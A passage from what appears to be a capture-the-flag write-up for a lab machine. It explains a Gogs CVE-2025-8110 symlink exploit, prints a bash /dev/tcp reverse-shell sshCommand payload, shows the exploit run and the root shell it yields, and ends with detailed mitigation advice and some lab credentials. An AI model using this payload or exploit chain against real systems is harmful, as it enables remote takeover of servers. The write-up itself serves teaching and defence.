| `-x` / `--proxy` | Optional: route traffic through Burp (localhost:8080) for debugging. |

**Script function breakdown:**

| Function | Purpose |
|---|---|
| `login()` | GETs the login page to extract the hidden `_csrf` token, then POSTs credentials. Checks the final URL — if still on `/user/login`, authentication failed. Returns the session cookie. |
| `create_malicious_repo()` | Calls `POST /api/v1/user/repos` with `auto_init: true` to create a randomly-named repository. `auto_init` is required because the repo must have at least one commit before git clone will work. Returns the repository name. |
| `upload_malicious_symlink()` | Clones the repo to `/tmp/<repo_name>`, creates `os.symlink(".git/config", "malicious_link")` (a relative symlink pointing to `.git/config`), commits it, and pushes. Gogs stores the symlink object in the repository — it does not follow it at this stage. |
| `exploit()` | PUTs base64-encoded `git_config` content to the `malicious_link` file path via the Contents API. Gogs follows the symlink when writing, so the content is written to the real `.git/config`. The `sshCommand` injected here is executed when Gogs next performs an SSH-based git operation on the repo. |
| `main()` | Builds the reverse shell `sshCommand` string, then calls: `login` → `create_malicious_repo` → `upload_malicious_symlink` → `exploit` in sequence. |

**The `sshCommand` payload:**
```
sshCommand = bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' #
```
- `sshCommand` is a Git configuration directive that tells Git which SSH binary to use when making SSH connections. Git passes remote URLs and arguments to this command.
- The `#` at the end comments out the Git-appended arguments (such as remote URLs), preventing syntax errors.
- When Gogs internally performs a Git operation using SSH on this repository (triggered by the API call), Git reads the injected config and executes the reverse shell command as the `root` user.

### Exploitation

Run the exploit, targeting the locally forwarded Gogs instance:

```shell
┌──(kali㉿kali)-[~]
└─$ python3 CVE-2025-8110-RCE.py -u http://localhost:3001 -lh 10.10.15.113 -lp 4444 -U 'cognito' -p 'Password123!' -t '5d2697fe0cf01759cca8b1b55c465c30ee2f0314'


   _____ _____   _____ 
  / ____|  __ \ / ____|
 | |  __| |__) | |  __ 
 | | |_ |  _  /| | |_ |
 | |__| | | \ \| |__| |
  \_____|_|  \_\\_____| 
                       
CVE-2025-8110 - Gogs Remote Code Execution
Authenticated RCE via Symlink + sshCommand Injection


Author : ghxtsec
Based on: zAbuQasem original PoC
------------------------------------------------

[+] Login successful
[+] Repo created: 5663c9389d1c
[+] Clone url: http://cognito:Password123%21@localhost:3001/cognito/5663c9389d1c.git
[+] Symlink created & uploaded

```

### Root Shell

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.113] from (UNKNOWN) [10.129.26.220] 43666
bash: cannot set terminal process group (1537): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# cd /root
cd /root
root@silentium:~# wc -c root.txt
33 root.txt
```

---

## Mitigations & Recommendations

### 1. Upgrade Flowise — Remediate CVE-2025-58434 and CVE-2025-59528

**Action:** Upgrade Flowise to version **3.0.6** or later immediately. Version 3.0.5 is affected by two critical vulnerabilities:
- **CVE-2025-58434** (CVSS 9.8) — Unauthenticated password reset token disclosure enabling full account takeover.
- **CVE-2025-59528** (CVSS 10.0) — Remote code execution via the `CustomMCP` node's unsanitized `Function()` constructor.

```shell
# Update Flowise in Docker
docker pull flowiseai/flowise:latest
docker-compose up -d --force-recreate
```

If upgrading is not immediately possible, restrict access to the Flowise API by placing it behind an authentication proxy (e.g., nginx with HTTP Basic Auth) and blocking public access to `/api/v1/account/forgot-password` and `/api/v1/node-load-method/` endpoints entirely.

**Root Cause (CVE-2025-58434):** The `/api/v1/account/forgot-password` endpoint returned the full `tempToken`, user credentials hash, and account metadata directly in the JSON response body. The token should only have been sent to the user's registered email address via an out-of-band channel.

**Root Cause (CVE-2025-59528):** The `CustomMCP` node's `convertToValidJSONString` function passed user-supplied input directly into JavaScript's `Function()` constructor without sanitization or sandboxing, enabling `process.mainModule.require("child_process")` to execute arbitrary OS commands.

---

### 2. Do Not Expose Staging Environments Publicly

**Action:** Remove the `staging.silentium.htb` virtual host from the public-facing nginx configuration. Staging and development environments should only be accessible from:
- Internal networks (VPN-only access).
- Specific developer IP ranges via firewall rules.
- Behind an authentication gateway.

```nginx
# nginx — restrict staging to internal IPs only
server {
    listen 80;
    server_name staging.silentium.htb;

    allow 10.0.0.0/8;      # Internal network
    allow 172.16.0.0/12;    # Docker networks
    deny all;               # Block all other access

    location / {
        proxy_pass http://127.0.0.1:3000;
    }
}
```

**Root Cause:** The staging subdomain hosting Flowise 3.0.5 was publicly accessible and discoverable via subdomain enumeration. Staging environments typically have weaker security controls, debug features enabled, and outdated software — making them high-value targets.

---

### 3. Avoid Credential Reuse Between Services

**Action:** Use unique, randomly generated passwords for each service. The SMTP password (`r04D!!_R4ge`) should not be reused as a Linux user's SSH password:

- Use a password manager to generate and store unique credentials per service.
- Implement SSH key-based authentication and disable password-based SSH login entirely.
- Use distinct service accounts for each application rather than sharing the `ben` user.

```shell
# Disable SSH password authentication — force key-based auth
# /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes
```

**Root Cause:** The SMTP service password (`SMTP_PASSWORD=r04D!!_R4ge`) discovered in the Docker container's environment variables was identical to user `ben`'s SSH password on the host system. This single credential reuse pivoted the attack from an isolated container to the host OS.

---

### 4. Secure Docker Environment Variables — Use Secrets Management

**Action:** Never pass sensitive credentials as plain-text environment variables in `docker-compose.yml` or `docker run` commands. These are visible to any process inside the container (via `/proc/*/environ`, the `env` command, or `docker inspect`):

```yaml
# BAD: plain-text credentials in docker-compose.yml
environment:
  - FLOWISE_PASSWORD=F1l3_d0ck3r
  - SMTP_PASSWORD=r04D!!_R4ge
  - JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDD

# GOOD: use Docker Secrets
services:
  flowise:
    secrets:
      - flowise_password
      - smtp_password
      - jwt_secret

secrets:
  flowise_password:
    file: ./secrets/flowise_password.txt
  smtp_password:
    file: ./secrets/smtp_password.txt
  jwt_secret:
    file: ./secrets/jwt_secret.txt
```

Additionally, replace the placeholder JWT secrets (`AABBCCDDAABBCCDDAABBCCDDAABBCCDD`) with cryptographically random values:

```shell
# Generate a secure JWT secret
openssl rand -hex 32
```

**Root Cause:** The Docker container exposed all configuration via environment variables — including `FLOWISE_PASSWORD`, `SMTP_PASSWORD`, and JWT signing secrets. Gaining root inside the container (via CVE-2025-59528) immediately revealed these secrets via the `env` command, enabling lateral movement to the host.

---

### 5. Run Docker Containers as Non-Root Users

**Action:** Configure the Flowise Docker container to run as a non-root user. Running as root inside a container expands the attack surface — environment variables, mounted volumes, and kernel capabilities are all more accessible:

```dockerfile
# Dockerfile — run Flowise as a non-root user
FROM flowiseai/flowise:3.0.6
RUN addgroup -S flowise && adduser -S flowise -G flowise
USER flowise
```

Or in `docker-compose.yml`:

```yaml
services:
  flowise:
    image: flowiseai/flowise:3.0.6
    user: "1000:1000"
```

**Root Cause:** The Flowise container ran as `root` (confirmed by `whoami` output). While container isolation limits host access, root inside the container can read all environment variables, modify the filesystem, and potentially exploit container escape vulnerabilities if any exist.

---

### 6. Upgrade Gogs — Remediate CVE-2025-8110

**Action:** Upgrade Gogs to a version that patches CVE-2025-8110. Alternatively, migrate to **Gitea** (a maintained community fork of Gogs) which has addressed this and other symlink-related vulnerabilities:

```shell
# Option 1: Update Gogs
cd /opt/gogs
wget https://dl.gogs.io/<latest-version>/gogs_<latest-version>_linux_amd64.tar.gz
tar xzf gogs_<latest-version>_linux_amd64.tar.gz

# Option 2: Migrate to Gitea (recommended — Gogs is sporadically maintained)
```

If upgrading is not immediately feasible, disable the API Contents endpoint or restrict it to read-only operations for non-admin users.

**Root Cause:** Gogs 0.13.3's `PutContents` API followed symbolic links when writing file content, allowing an attacker to overwrite the repository's `.git/config` with a malicious `sshCommand` directive. The symlink bypass was an incomplete fix for the prior CVE-2024-55947.

---

### 7. Do Not Run Gogs as Root

**Action:** Run the Gogs service as a dedicated, unprivileged user (e.g., `git`) instead of `root`. This limits the impact of any code execution vulnerability to the privileges of the Gogs service account rather than full system control:

```shell
# Create a dedicated service user
useradd -r -m -s /bin/bash git

# Change ownership of the Gogs installation
chown -R git:git /opt/gogs

# Create a systemd service unit running as 'git'
cat > /etc/systemd/system/gogs.service << 'EOF'
[Unit]
Description=Gogs Git Service
After=network.target

[Service]
Type=simple
User=git
Group=git
WorkingDirectory=/opt/gogs/gogs
ExecStart=/opt/gogs/gogs/gogs web
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl restart gogs
```

**Root Cause:** The Gogs process ran as `root` (`ps aux` confirmed `root 1537 ... /opt/gogs/gogs/gogs web`). When CVE-2025-8110 was exploited, the injected `sshCommand` executed as `root`, granting immediate full system compromise without requiring any further privilege escalation.

---

### 8. Implement Network Segmentation — Isolate Internal Services

**Action:** Internal services like Gogs (port 3001), MailHog (ports 1025/8025), and Docker containers should be deployed on isolated network segments that are not reachable even from the host's user sessions:

- Use a dedicated Docker network for inter-container communication.
- Place Gogs behind an internal VPN or bastion host.
- Use firewall rules (`iptables`/`nftables`) to restrict localhost-bound services from being accessible via SSH port forwarding.

```shell
# Prevent SSH port forwarding to internal services
# /etc/ssh/sshd_config
AllowTcpForwarding no
PermitOpen none
```

**Root Cause:** User `ben` was able to SSH tunnel port 3001 (Gogs) to the attacker's machine, exposing the internal Git service to external exploitation. While Gogs was correctly bound to localhost, SSH port forwarding bypassed this restriction entirely.

